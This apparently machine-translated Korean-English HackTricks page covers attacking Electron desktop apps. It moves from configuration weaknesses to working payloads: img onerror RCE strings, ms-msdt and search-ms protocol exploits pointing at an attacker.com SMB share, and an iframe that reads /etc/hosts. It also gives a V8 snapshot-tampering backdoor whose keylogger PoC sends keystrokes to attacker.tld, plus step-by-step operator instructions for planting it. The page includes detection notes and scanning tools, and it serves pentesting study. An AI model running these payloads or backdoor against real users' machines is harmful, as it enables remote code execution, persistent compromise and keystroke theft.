# Electron 데스크톱 앱

{{#include ../../../banners/hacktricks-training.md}}

## 소개

Electron은 로컬 백엔드(**NodeJS**)와 프론트엔드(**Chromium**)를 결합하지만, 현대 브라우저의 일부 보안 메커니즘은 갖추고 있지 않습니다.

일반적으로 Electron 앱 코드는 `.asar` 애플리케이션 내부에 존재합니다. 코드를 얻으려면 이를 추출해야 합니다:
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
Electron 앱의 소스 코드에서, `packet.json` 안에 보안 설정이 적용된 `main.js` 파일이 지정되어 있는 것을 찾을 수 있습니다.
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electron에는 2가지 프로세스 유형이 있습니다:

- Main Process (NodeJS에 대한 완전한 접근 권한 보유)
- Renderer Process (보안상 NodeJS 접근 권한을 제한해야 함)

![](<../../../images/image (182).png>)

**renderer process**는 파일을 로드하는 브라우저 창입니다:
```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```
Settings of the **렌더러 프로세스** can be **구성** in the **메인 프로세스** inside the main.js file. Some of the configurations will **Electron 애플리케이션이 RCE를 얻는 것을 방지**하거나 다른 취약점을 막을 수 있습니다 if the **설정이 올바르게 구성된 경우**.

The Electron 애플리케이션 **Node apis를 통해 기기에 접근할 수 있습니다** although it can be configure to prevent it:

- **`nodeIntegration`** - 기본값은 `off`입니다. 활성화되면 렌더러 프로세스에서 Node 기능에 접근할 수 있습니다.
- **`contextIsolation`** - 기본값은 `on`입니다. 비활성화하면 메인 프로세스와 렌더러 프로세스가 분리되지 않습니다.
- **`preload`** - 기본값은 비어 있습니다.
- [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - 기본적으로 `off`입니다. NodeJS가 수행할 수 있는 동작을 제한합니다.
- Workers에서의 Node Integration
- **`nodeIntegrationInSubframes`** - 기본값은 `off`입니다.
- If **`nodeIntegration`** is **enabled**, this would allow the use of **Node.js APIs** in web pages that are **loaded in iframes** within an Electron application.
- If **`nodeIntegration`** is **disabled**, then preloads will load in the iframe

Example of configuration:
```javascript
const mainWindowOptions = {
title: "Discord",
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: "EnumerateDevices,AudioOutputDevices",
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true,
},
}
```
다음은 [here](https://7as.es/electron/nodeIntegration_rce.txt)에서 가져온 몇 가지 **RCE payloads**:
```html
Example Payloads (Windows):
<img
src="x"
onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
src="x"
onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('id').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('uname -a').toString());" />
```
### 트래픽 캡처

start-main 구성을 수정하고 다음과 같은 proxy 사용을 추가하세요:
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electron 로컬 코드 인젝션

If you can execute locally an Electron App it's possible that you could make it execute arbitrary javascript code. Check how in:


{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

## RCE: XSS + nodeIntegration

만약 **nodeIntegration**이 **on**으로 설정되어 있다면, 웹 페이지의 JavaScript는 `require()`를 호출하는 것만으로 Node.js 기능을 쉽게 사용할 수 있습니다. 예를 들어, Windows에서 calc 애플리케이션을 실행하는 방법은 다음과 같습니다:
```html
<script>
require("child_process").exec("calc")
// or
top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```
<figure><img src="../../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

이 설정에 지정된 스크립트는 **renderer의 다른 스크립트들보다 먼저 로드**되므로, **Node APIs에 무제한 접근** 권한을 갖습니다:
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
따라서, 이 스크립트는 node-features를 페이지로 내보낼 수 있습니다:
```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
require("child_process").exec("calc")
}
```

```html:index.html
<body>
<script>
typeof require === "undefined"
runCalc()
</script>
</body>
```
> [!NOTE] > **If `contextIsolation` is on, this won't work**

## RCE: XSS + contextIsolation

The _**contextIsolation**_ introduces the **separated contexts between the web page scripts and the JavaScript Electron's internal code** so that the JavaScript execution of each code does not affect each. This is a necessary feature to eliminate the possibility of RCE.

컨텍스트가 격리되어 있지 않다면 공격자는 다음을 수행할 수 있습니다:

1. **renderer에서 임의의 JavaScript 실행** (XSS 또는 외부 사이트로의 이동)
2. **preload 또는 Electron 내부 코드에서 사용되는 내장 메서드를 덮어쓰기**
3. **덮어쓴 함수의 사용을 트리거**
4. RCE?

내장 메서드를 덮어쓸 수 있는 곳은 2곳이 있습니다: preload 코드 또는 Electron 내부 코드 안:

{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### 클릭 이벤트 우회

링크를 클릭할 때 제한이 적용되어 있다면 일반 왼쪽 클릭 대신 **중간 클릭을 사용**하여 우회할 수 있습니다
```javascript
window.addEventListener('click', (e) => {
```
## shell.openExternal을 통한 RCE

이 예제들에 대한 자세한 내용은 [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) 및 [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)을 확인하세요

Electron 데스크톱 애플리케이션을 배포할 때 `nodeIntegration`과 `contextIsolation`을 올바르게 설정하는 것은 매우 중요합니다. 이러한 설정이 적용되면 preload 스크립트나 메인 프로세스에서 Electron의 네이티브 코드로 향하는 **client-side remote code execution (RCE)**는 효과적으로 차단된다고 알려져 있습니다.

사용자가 링크를 클릭하거나 새 창을 열 때 특정 이벤트 리스너가 트리거되며, 이는 애플리케이션의 보안과 기능에 중요합니다:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
이들 리스너는 **데스크탑 애플리케이션에 의해 오버라이드되어** 자체적인 **비즈니스 로직**을 구현합니다. 애플리케이션은 이동한 링크를 내부에서 열지 외부 웹 브라우저에서 열지를 판단합니다. 이 결정은 일반적으로 `openInternally` 함수에서 이루어집니다. 해당 함수가 `false`를 반환하면 링크를 외부에서 열어야 함을 나타내며, 이때 `shell.openExternal` 함수를 사용합니다.

**다음은 단순화된 의사코드입니다:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../../images/image (963).png>)

Electron JS의 보안 권장사항은 `openExternal` 함수를 통해 신뢰할 수 없는 콘텐츠를 받아들이지 않을 것을 권고합니다. 이는 다양한 프로토콜을 통해 RCE로 이어질 수 있기 때문입니다. 운영 체제는 RCE를 유발할 수 있는 서로 다른 프로토콜을 지원합니다. 이 주제에 대한 자세한 예시와 설명은 [this resource](https://positive.security/blog/url-open-rce#windows-10-19042)를 참고할 수 있으며, 해당 자료에는 이 취약점을 악용할 수 있는 Windows 프로토콜 예시가 포함되어 있습니다.

macos에서는 `openExternal` 함수를 악용하여 `shell.openExternal('file:///System/Applications/Calculator.app')`와 같이 임의의 명령을 실행할 수 있습니다.

**Windows 프로토콜 exploits의 예시는 다음과 같습니다:**
```html
<script>
window.open(
"ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
)
</script>

<script>
window.open(
"search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
)
</script>

<script>
window.open(
"ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
)
</script>
```
## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

이 취약점은 **[this report](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**에서 확인할 수 있다.

**webviewTag**는 **사용 중단된 기능**으로, **renderer process**에서 **NodeJS** 사용을 허용합니다. 이는 preload context 내부에 다음과 같이 스크립트를 로드할 수 있게 하므로 비활성화해야 합니다:
```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```
따라서 임의의 페이지를 로드할 수 있는 공격자는 해당 태그를 사용해 **임의의 preload 스크립트를 로드할 수 있다**.

이 preload 스크립트는 이후 **취약한 IPC 서비스 (`skype-new-window`)** 를 호출하도록 악용되었고, 해당 서비스가 **`shell.openExternal`** 를 호출하여 RCE를 획득했다:
```javascript
(async() => {
const { ipcRenderer } = require("electron");
await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
setTimeout(async () => {
const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
}, 5000);
})();
```
## 내부 파일 읽기: XSS + contextIsolation

**`contextIsolation`을 비활성화하면 `<webview>` 태그를 사용할 수 있습니다**, `<iframe>`와 유사하게 로컬 파일을 읽고 exfiltrating할 수 있습니다. 예시에서는 이 취약점을 악용해 내부 파일의 내용을 읽는 방법을 보여줍니다:

![](<../../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

또한 **내부 파일을 읽는 방법** 하나가 더 공유되어 Electron desktop app에서 치명적인 로컬 파일 읽기 취약점을 강조합니다. 이 방법은 스크립트를 주입하여 애플리케이션을 악용하고 데이터를 exfiltrate하는 것을 포함합니다:
```html
<br /><br /><br /><br />
<h1>
pwn<br />
<iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j() {
alert(
"pwned contents of /etc/hosts :\n\n " +
frames[0].document.body.innerText
)
}
</script>
</h1>
```
## **RCE: XSS + 구형 chromium**

애플리케이션에서 사용하는 **chromium**이 **구형**이고 그 위에 **known vulnerabilities**가 존재한다면, 이를 **exploit**하여 **XSS**를 통해 **RCE**를 얻을 수 있습니다.\  
You can see an example in this **writeup**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **Internal URL regex bypass를 통한 XSS Phishing**

XSS를 발견했지만 **RCE를 유발하거나 내부 파일을 탈취할 수 없는** 경우, 이를 이용해 **phishing**으로 **credentials**를 탈취해 볼 수 있습니다.

우선 새 URL을 열려고 할 때 어떤 일이 발생하는지 알아야 합니다. 프론트엔드의 JS 코드를 확인하세요:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
**`openInternally`** 호출은 해당 **link**가 플랫폼 소속의 링크로서 **desktop window**에서 **opened** 될지, **or** **browser as a 3rd party resource**에서 열릴지를 결정합니다.

함수에서 사용되는 **regex**가 **vulnerable to bypasses**한 경우(예: **not escaping the dots of subdomains**), 공격자는 XSS를 악용해 공격자 인프라에 위치한 **open a new window which**를 열어 사용자에게 **asking for credentials**를 요청할 수 있습니다:
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## `file://` 프로토콜

As mentioned in [the docs](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols) pages running on **`file://`** have unilateral access to every file on your machine meaning that **XSS issues can be used to load arbitrary files** from the users machine. Using a **사용자 정의 프로토콜** prevents issues like this as you can limit the protocol to only serving a specific set of files.

## Remote module

The Electron Remote module allows **renderer processes to access main process APIs**, facilitating communication within an Electron application. However, enabling this module introduces significant security risks. It expands the application's attack surface, making it more susceptible to vulnerabilities such as cross-site scripting (XSS) attacks.

> [!TIP]
> 비록 **remote** 모듈이 main에서 renderer로 일부 API를 노출하지만, 구성요소만 악용한다고 해서 곧바로 RCE를 얻는 것은 쉽지 않습니다. 다만 구성요소가 민감한 정보를 노출할 수 있습니다.

> [!WARNING]
> Many apps that still use the remote module do it in a way that **require NodeIntegration to be enabled** in the renderer process, which is a **huge security risk**.

Since Electron 14 the `remote` module of Electron might be enabled in several steops cause due to security and performance reasons it's **사용하지 않는 것이 권장됩니다**.

To enable it, it'd first needed to **메인 프로세스에서 활성화해야** 합니다:
```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
mainWindow = new BrowserWindow({
[...]
})
remoteMain.enable(mainWindow.webContents)
```
그런 다음, 렌더러 프로세스는 다음과 같이 모듈에서 객체를 import할 수 있습니다:
```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```
**[blog post](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)**은 remote 모듈의 객체 **`app`**이 노출하는 몇 가지 흥미로운 **함수들**을 설명합니다:

- **`app.relaunch([options])`**
- **애플리케이션을 재시작**합니다 — 현재 인스턴스를 **종료**하고 새 인스턴스를 **시작**합니다. **app 업데이트**나 중요한 **상태 변경**에 유용합니다.
- **`app.setAppLogsPath([path])`**
- **app 로그**를 저장할 디렉터리를 **정의**하거나 **생성**합니다. 로그는 **`app.getPath()`** 또는 **`app.setPath(pathName, newPath)`**를 사용해 **가져오거나**(**retrieved**) **수정**(**modified**)할 수 있습니다.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**
- 지정한 **프로토콜**의 **기본 핸들러**로 현재 실행 파일을 **등록**합니다. 필요하면 **사용자 지정 경로**와 **인수**를 제공할 수 있습니다.
- **`app.setUserTasks(tasks)`**
- Windows의 **Jump List** 내 **Tasks 카테고리**에 작업을 **추가**합니다. 각 작업은 앱이 어떻게 **실행**되는지 또는 어떤 **인수**가 전달되는지를 제어할 수 있습니다.
- **`app.importCertificate(options, callback)`**
- 시스템의 **certificate store**에 **PKCS#12 certificate**를 **임포트(가져오기)**합니다 (Linux 전용). 결과 처리를 위해 **callback**을 사용할 수 있습니다.
- **`app.moveToApplicationsFolder([options])`**
- macOS에서 애플리케이션을 **Applications 폴더**로 **이동**합니다. Mac 사용자를 위한 **표준 설치**를 보장하는 데 도움이 됩니다.
- **`app.setJumpList(categories)`**
- Windows에서 **custom Jump List**를 **설정**하거나 **제거**합니다. 작업이 사용자에게 어떻게 표시되는지 정리하기 위해 **카테고리(categories)**를 지정할 수 있습니다.
- **`app.setLoginItemSettings(settings)`**
- 어떤 **실행 파일(executables)**이 로그인 시 **실행**되는지와 그 **옵션**을 **구성**합니다 (macOS 및 Windows 전용).

Example:
```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```
## systemPreferences 모듈

Electron에서 시스템 환경설정에 접근하고 시스템 이벤트를 발생시키기 위한 **주요 API**입니다. **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault**, 그리고 **setUserDefault** 같은 메서드들은 모두 이 모듈의 **일부**입니다.

**사용 예시:**
```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```
### **subscribeNotification / subscribeWorkspaceNotification**

* **수신**: NSDistributedNotificationCenter를 사용해 **native macOS notifications**을 수신합니다.
* **macOS Catalina 이전**에는 CFNotificationCenterAddObserver에 **nil**을 전달하여 **all** distributed notifications을 sniff할 수 있었습니다.
* **Catalina / Big Sur 이후**에는 sandboxed apps가 이름으로 notifications를 등록하여 **screen locks/unlocks**, **volume mounts**, **network activity** 등 많은 이벤트를 여전히 **subscribe**할 수 있습니다.

### **getUserDefault / setUserDefault**

* NSUserDefaults와 **인터페이스**하며, macOS에서 **application** 또는 **global** 환경설정을 저장합니다.

* **getUserDefault**는 최근 파일 위치나 사용자의 지리적 위치 등 민감한 정보를 **retrieve**할 수 있습니다.

* **setUserDefault**는 이러한 환경설정을 **modify**하여 앱의 **configuration**에 영향을 줄 수 있습니다.

* 오래된 Electron 버전(v8.3.0 이전)에서는 NSUserDefaults의 **standard suite**만 접근 가능했습니다.

## Shell.showItemInFolder

이 함수는 파일 매니저에서 지정된 파일을 보여주며, 파일이 자동으로 실행될 수 있습니다.

For more information check [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

## Content Security Policy

Electron 앱은 XSS 공격을 방지하기 위해 Content Security Policy (CSP)를 가져야 합니다. CSP는 브라우저에서 신뢰되지 않은 코드의 실행을 방지하는 보안 표준입니다.

대개 `main.js` 파일이나 `index.html` 템플릿의 meta 태그 안에 있는 CSP로 구성됩니다.

자세한 내용은 다음을 확인하세요:


{{#ref}}
pentesting-web/content-security-policy-csp-bypass/
{{#endref}}


## RCE: Webview CSP + postMessage trust + local file loading (VS Code 1.63)

이 실전 체인은 Visual Studio Code 1.63 (CVE-2021-43908)에 영향을 미쳤으며, webview에서 단일 markdown 기반 XSS가 CSP, postMessage 및 scheme handlers가 잘못 구성된 경우 어떻게 전체 RCE로 확장될 수 있는지 보여줍니다. Public PoC: https://github.com/Sudistark/vscode-rce-electrovolt

Attack chain overview
- First XSS via webview CSP: 생성된 CSP는 `style-src 'self' 'unsafe-inline'`를 포함하여 `vscode-webview://` 컨텍스트에서 인라인/스타일 기반 인젝션을 허용했습니다. 페이로드는 대상 webview의 extensionId를 exfiltrate하기 위해 `/stealID`로 beaconed 했습니다.
- Constructing target webview URL: 유출된 ID를 사용해 `vscode-webview://<extensionId>/.../<publicUrl>`를 구성했습니다.
- Second XSS via postMessage trust: 외부 webview는 `window.postMessage`를 엄격한 origin/type 검사 없이 신뢰했고, `allowScripts: true`로 공격자 HTML을 로드했습니다.
- Local file loading via scheme/path rewriting: 페이로드는 `file:///...`을 `vscode-file://vscode-app/...`로 재작성하고 `exploit.md`를 `RCE.html`로 교체하여 약한 경로 검증을 악용해 권한 있는 로컬 리소스를 로드했습니다.
- RCE in Node-enabled context: 로드된 HTML은 Node API가 사용 가능한 상태로 실행되어 OS 명령 실행을 획득했습니다.

Example RCE primitive in the final context
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```
postMessage 신뢰 문제 관련 참고 자료:

{{#ref}}
../../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## **도구**

- [**Electronegativity**](https://github.com/doyensec/electronegativity)는 Electron-based applications의 잘못된 설정과 보안 안티패턴을 식별하는 도구입니다.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint)는 Electronegativity를 사용하는 Electron applications용 오픈 소스 VS Code 플러그인입니다.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan)는 취약한 서드파티 라이브러리를 검사하는 데 사용됩니다.
- [**Electro.ng**](https://electro.ng/): 구매해야 합니다

## 실습

[https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)에서 취약한 Electron 앱을 익스플로잇하는 실습을 찾을 수 있습니다.

실습에 도움이 될 몇 가지 명령:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## 로컬 백도어 삽입 via V8 heap snapshot tampering (Electron/Chromium) – CVE-2025-55305

Electron 및 Chromium 기반 앱은 시작 시 미리 빌드된 V8 heap snapshot을 역직렬화하여 각 V8 isolate (main, preload, renderer)를 초기화합니다 (v8_context_snapshot.bin, 선택적으로 browser_v8_context_snapshot.bin). 역사적으로, Electron’s integrity fuses는 이러한 snapshots를 실행 가능한 콘텐츠로 취급하지 않았기 때문에 fuse 기반 무결성 강제와 OS 코드 서명 검사를 모두 회피했습니다. 결과적으로, 사용자 쓰기 가능한 설치 경로의 snapshot을 교체하면 서명된 바이너리나 ASAR을 수정하지 않고도 앱 내에서 은밀하고 지속적인 코드 실행을 확보할 수 있었습니다.

Key points
- Integrity gap: EnableEmbeddedAsarIntegrityValidation and OnlyLoadAppFromAsar는 ASAR 내부의 앱 JavaScript를 검증하지만, V8 heap snapshots는 검증 대상이 아니었습니다 (CVE-2025-55305). Chromium 또한 snapshots에 대해 무결성 검사를 수행하지 않습니다.
- Attack preconditions: 앱 설치 디렉터리에 대한 로컬 파일 쓰기 권한. Electron 앱이나 Chromium 브라우저가 사용자 쓰기 가능한 경로에 설치되는 시스템에서 흔합니다(예: %AppData%\Local on Windows; /Applications with caveats on macOS).
- Effect: 자주 사용되는 builtin(“gadget”)을 덮어써서 어떤 isolate에서도 공격자 JavaScript를 신뢰성 있게 실행하도록 하며, 이를 통해 지속성 확보 및 코드 서명 검증 회피가 가능합니다.
- Affected surface: snapshot을 사용자 쓰기 가능한 위치에서 로드하는 Electron 앱(심지어 fuses가 활성화된 경우도 포함) 및 Chromium 기반 브라우저.

Generating a malicious snapshot without building Chromium
- Use the prebuilt electron/mksnapshot to compile a payload JS into a snapshot and overwrite the application’s v8_context_snapshot.bin.

Example minimal payload (prove execution by forcing a crash)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
// Executed whenever the app calls Array.isArray
throw new Error("testing isArray gadget");
};
```
Isolate-aware 페이로드 라우팅 (main vs. renderer에서 서로 다른 코드 실행)
- Main process detection: Node 전용 전역 객체인 process.pid, process.binding(), process.dlopen 등이 main process isolate에 존재합니다.
- Browser/renderer detection: document 컨텍스트에서 실행될 때 alert 같은 Browser 전용 전역 객체를 사용할 수 있습니다.

한 번만 main-process의 Node 기능을 탐지하는 예제 가젯
```js
const orig = Array.isArray;

Array.isArray = function() {
// Defer until we land in main (has Node process)
try {
if (!process || !process.pid) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

// Run once
if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
console.log('[payload] isArray hook started ...');

// Capability probing in main
console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
process.exit(0);
}
return orig(...arguments);
};
```
Renderer/browser-context 데이터 탈취 PoC (예: Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
// Wait for a browser context
try {
if (!alert) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
setInterval(() => {
window.onkeydown = (e) => {
fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
}
}, 1000);
}
return orig(...arguments);
};
```
Operator workflow
1) 공통 내장 함수(예: Array.isArray)를 덮어쓰고 선택적으로 isolate별 분기 처리를 하는 payload.js를 작성한다.
2) Chromium 소스 없이 snapshot을 빌드한다:
- npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) 대상 애플리케이션의 snapshot 파일을 덮어쓴다:
- v8_context_snapshot.bin (항상 사용됨)
- browser_v8_context_snapshot.bin (LoadBrowserProcessSpecificV8Snapshot fuse가 사용된 경우)
4) 애플리케이션을 실행하면 선택한 내장 함수가 사용될 때마다 gadget이 실행된다.

Notes and considerations
- Integrity/signature bypass: Snapshot 파일은 코드 서명 검사에서 네이티브 실행 파일로 취급되지 않으며 (역사적으로) Electron의 fuses나 Chromium 무결성 제어의 적용 대상이 아니었다.
- Persistence: 사용자 쓰기 가능한 설치 위치의 snapshot을 교체하면 일반적으로 앱 재시작을 견디며 서명된 합법적 앱처럼 보인다.
- Chromium browsers: 동일한 변조 개념은 사용자 쓰기 가능한 위치에 설치된 Chrome/파생 브라우저에도 적용된다. Chrome은 다른 무결성 완화책을 보유하고 있지만 물리적 로컬 공격은 위협 모델에서 명시적으로 제외한다.

Detection and mitigations
- Snapshot을 실행 가능한 콘텐츠로 취급하고 무결성 강제에 포함시킨다 (CVE-2025-55305 수정).
- 관리자 전용 쓰기 가능한 설치 위치를 권장; v8_context_snapshot.bin 및 browser_v8_context_snapshot.bin의 해시를 기준선으로 설정하고 모니터링한다.
- 초기 런타임에서의 내장 함수 덮어쓰기와 예상치 못한 snapshot 변경을 탐지한다; 역직렬화된 스냅샷이 예상 값과 일치하지 않을 때 경보를 발생시킨다.

## **References**

- [SecureLayer7: Electron Research in Desktop apps (Part 1)](https://blog.securelayer7.net/electron-app-security-risks/)
- [VS Code RCE PoC (CVE-2021-43908) – electrovolt](https://github.com/Sudistark/vscode-rce-electrovolt)
- [GitHub Advisory GHSA-2q4g-w47c-4674 (CVE-2020-15174)](https://github.com/advisories/GHSA-2q4g-w47c-4674)
- [MSRC: CVE-2021-43908](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-43908)
- [Trail of Bits: Subverting code integrity checks to locally backdoor Signal, 1Password, Slack, and more](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [Electron fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [Electron ASAR integrity](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [V8 custom startup snapshots](https://v8.dev/blog/custom-startup-snapshots)
- [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [Loki C2](https://github.com/boku7/Loki/)
- [Chromium: Disable loading of unsigned code (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [Chrome security FAQ: physically local attacks out of scope](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically-local-attacks-in-chromes-threat-model)
- [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- More researches and write-ups about Electron security in [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
- [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

{{#include ../../../banners/hacktricks-training.md}}
